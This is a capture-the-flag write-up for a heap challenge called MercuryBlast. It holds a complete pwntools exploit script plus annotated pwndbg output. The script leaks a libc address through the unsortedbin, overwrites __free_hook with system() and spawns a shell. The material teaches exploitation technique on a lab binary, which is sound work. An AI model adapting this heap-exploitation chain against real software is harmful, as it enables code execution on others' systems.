# MercuryBlast

Author: y-chav

# Solution
```py
from pwn import * 

binary = "./MercuryBlast"
p = process(binary)
s = '''
b * edit_record+384
b * delete_record
'''
# add_record+334 before read()
#b * print_records+223
context.log_level = 'debug'
libc = ELF('./libc.so.6')
elf = ELF(binary)


def add_record(size, data):
    p.sendlineafter("Your choice: ", "1")
    p.sendlineafter("Input Temperature:", "1")
    p.sendlineafter("Input Description Size: ", str(size))
    p.sendafter("Input Description: ", data)

def edit_record(index, size, buffer): # size <= 0x200
    p.sendlineafter("Your choice: ", "4")
    p.sendlineafter("Input index: ", str(index))
    p.sendlineafter("Input Temperature: ", "1")
    p.sendlineafter("Input Description Size: ", str(size))
    p.sendafter("Input Description: ", buffer)

def delete_record(idx):
    p.sendlineafter("Your choice: ", "3")
    p.sendlineafter("Input Index:", str(idx))

def print_record():
    p.sendlineafter("Your choice: ", "2")
    #print(p.clean().decode())


add_record(0x200, b'AAAAAAAA') # 0 
add_record(0x200, b'AAAAAAAA') #1
add_record(0x200, b'AAAAAAAA') #2
add_record(0x200, b'AAAAAAAA') #3
add_record(0x200, b'AAAAAAAA') #4
add_record(0x200, b'AAAAAAAA') #5
add_record(0x200, b'AAAAAAAA') #6
add_record(0x200, b'AAAAAAAA') #7

# fill up the tcache
delete_record(0)
delete_record(1)
delete_record(2)
delete_record(3)
delete_record(4)
delete_record(5)
delete_record(7)

# using 7 here would merge with top chunk 
delete_record(6)

gdb.attach(p, s)

# previously 7th chunk first get allocated, now being an index 0 record 
add_record(0x200, b'AAAAAAAA') #0, 7
add_record(0x200, b'AAAAAAAA') #1, 5
add_record(0x200, b'AAAAAAAA') #2, 4
add_record(0x200, b'AAAAAAAA')#3, 6
add_record(0x200, b'AAAAAAAA')#4, 6
add_record(0x200, b'AAAAAAAA')#5, 6
add_record(0x200, b'AAAAAAAA')#6, 6

# previous chunks with 0x200 description size cannot get to the glibc addresses 
# therefore allocate a new chunk 
add_record(0x10, b'BBBBBBBB')#7, 6
print_record()

#edit_record(0, 0x200, payload)
p.recvuntil(b"Description: BBBBBBBB")
leak = p.recvuntil(b'\x7f')[:6].ljust(8, b'\x00')
leak = u64(leak)
#print(hex(leak))
#pwndbg> x/20x 0x7fc6b1288de0 - 0x7fc6b109c000
#0x1ecde0:	Cannot access memory at address 0x1ecde0
libc.address =  leak - 0x1ecde0 # actual libc base, verified with outputs and vmmp in pwndbg
#print(hex(libc.address))
sys_addr = libc.sym['system']
free_hook = libc.sym['__free_hook']
add_record(0x200, b'AAAAAAAA')
add_record(0x100, b'AAAAAAAA')
add_record(0x200, b'AAAAAAAA')
print(hex(libc.address))
edit_record(9, 0x200, b'A' * 0x100 + p64(0) + p64(0x21) + p64(0) + p64(0x100) + p64(free_hook))
edit_record(10, 0x8, p64(sys_addr))

edit_record(3, 0x8, b'/bin/sh\x00')
delete_record(3)


# now start arbirary write! using read()

p.interactive()
```
### process the binary
```py
binary = "./MercuryBlast"
p = process(binary)
```
### libc
```py
libc = ELF('./libc.so.6')
```
used for getting the offset of address of libc symbols from the libc base. For example,  
```py
sys_addr = libc.sym['system']
free_hook = libc.sym['__free_hook']
```
But once `libc.address` is set to the libc base address, the above would output the actual address of the symbols
### debugging 
```py
context.log_level = 'debug'
```
shows more debugging details
```py
s = '''
b * edit_record+384
b * delete_record
'''

gdb.attach(p, s)
```
debug with pwndbg to see the inside of the program together with breakpoints attached that stops the program at points you wish to inspect. 


### output parsing 
```py
def add_record(size, data):
    p.sendlineafter("Your choice: ", "1")
    p.sendlineafter("Input Temperature:", "1")
    p.sendlineafter("Input Description Size: ", str(size))
    p.sendafter("Input Description: ", data)

def edit_record(index, size, buffer): # size <= 0x200
    p.sendlineafter("Your choice: ", "4")
    p.sendlineafter("Input index: ", str(index))
    p.sendlineafter("Input Temperature: ", "1")
    p.sendlineafter("Input Description Size: ", str(size))
    p.sendafter("Input Description: ", buffer)

def delete_record(idx):
    p.sendlineafter("Your choice: ", "3")
    p.sendlineafter("Input Index:", str(idx))

def print_record():
    p.sendlineafter("Your choice: ", "2")
    #print(p.clean().decode())
```
Make functions to parse the outputs more easily and reduce redundancies of functions from the menu. Try to be more consistant on the parsing. For example, if you are using string `"Your choice: "` instead of byte string `b"Your choice: "`. It is better to then use string every other outputs. 
You were stuck here for quite a while still because of a pretty unknown reason, probably because of inconsistency. The problem was fixed when you copied this specific part from the template.


### Process
```py
for i in range(8):
    add_record(0x200, b'AAAAAAAA') # 0 

# fill up the tcache
for i in range(8):
    if i == 6:
        continue
    delete_record(i)

# using 7 here would merge with top chunk 
delete_record(6)
```
Allocate 8 chunks of the same size, in order words, `malloc` 8 times.  
Then, when we free 7 chunks out of those 8 chunks, `tcachebin` would be filled up.  
Next, free the last chunk while making sure that it is not the neighbour of the `Top chunk` to avoid merging. Because the priority of a chunk merging with a freed chunk or `Top chunk` is higher than going into `unsortedbin`  
The idea of making it go into `unsortedbin` is that when `unsortedbin` is used, there would shown up glibc addresses as `fd` and `bk` pointer as `unsortedbin` is in the `malloc_state` which is inside `libc.so` 

```py
for i in range(7):
    add_record(0x200, b'AAAAAAAA') # 0 

# previous chunks with 0x200 description size cannot get to the glibc addresses 
# therefore allocate a new chunk 

add_record(0x10, b'BBBBBBBB')#7, 6
print_record()
```
Allocate 6 (12) chunks that are in the `tcachebin` first. Then, there would be a 0x20 byte freed chunk in the `fastbin` (the record) and 0x200 byte chunk (description of the record) in `unsortedbin`.  
```
Free chunk (fastbins) | PREV_INUSE
Addr: 0x5629e5adbfb0
Size: 0x20 (with flag bits: 0x21)
fd: 0x00

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x5629e5adbfd0
Size: 0x210 (with flag bits: 0x211)
fd: 0x7fc6f1d15be0
bk: 0x7fc6f1d15be0
```
`add_record(0x10, b'BBBBBBBB')#7, 6` allocates two more chunks, a record and its corresponding description.
```
Allocated chunk | PREV_INUSE
Addr: 0x5629e5adbfd0
Size: 0x20 (with flag bits: 0x21)

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x5629e5adbff0
Size: 0x1f0 (with flag bits: 0x1f1)
fd: 0x7fc6f1d15be0
bk: 0x7fc6f1d15be0
```
The allocated chunk shown here
```
Allocated chunk | PREV_INUSE
Addr: 0x5629e5adbfd0
Size: 0x20 (with flag bits: 0x21)
``` 
is the description chunk allocated with 0x20 bytes specifically from the `unsortedbin`, after `fastbin` allocated 0x20 bytes to the record chunk.

Therefore, we can make use of the above chunk to perform a read on the glibc addresses of 
```
Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x5629e5adbff0
Size: 0x1f0 (with flag bits: 0x1f1)
fd: 0x7fc6f1d15be0
bk: 0x7fc6f1d15be0
```
by using `print_record()`
```c
write(STDOUT_FILENO, records[i]->description, records[i]->description_size);
```
Corresponding code on the script that outputs and leak the libc address:
```py
print_record()
p.recvuntil(b"Description: BBBBBBBB")
leak = p.recvuntil(b'\x7f')[:6].ljust(8, b'\x00')
leak = u64(leak)
```
With the libc address we leaked, how can we get the libc base address? 
Here is the trick
1. address leaked and parsed, we see it: `0x7fac1e319de0`
2. use `gdb.attach()` to open `gdb` 
3. type the `vmmap` command
4. Look for the runtime libc base
```
    0x7fac1e12b000     0x7fac1e12d000 rw-p     2000      0 [anon_7fac1e12b]
    0x7fac1e12d000     0x7fac1e14f000 r--p    22000      0 /home/kali/Desktop/CTF/MercuryBlast/libc-2.31.so
    0x7fac1e14f000     0x7fac1e2c7000 r-xp   178000  22000 /home/kali/Desktop/CTF/MercuryBlast/libc-2.31.so
    0x7fac1e2c7000     0x7fac1e315000 r--p    4e000 19a000 /home/kali/Desktop/CTF/MercuryBlast/libc-2.31.so
    0x7fac1e315000     0x7fac1e319000 r--p     4000 1e7000 /home/kali/Desktop/CTF/MercuryBlast/libc-2.31.so
    0x7fac1e319000     0x7fac1e31b000 rw-p     2000 1eb000 /home/kali/Desktop/CTF/MercuryBlast/libc-2.31.so
```
which is `0x7fac1e12d000` here 
5. copy both addresses and subtract them 
6. We can even use the pwndbg "calculator" to subtract
```
pwndbg> x/gx 0x7fac1e319de0 - 0x7fac1e12d000
0x1ecde0:	Cannot access memory at address 0x1ecde0
```
7. Boom! We get the fixed offset
8. Now 
```py
libc.address =  leak - 0x1ecde0
```
gets us the actual libc address


to be continued:
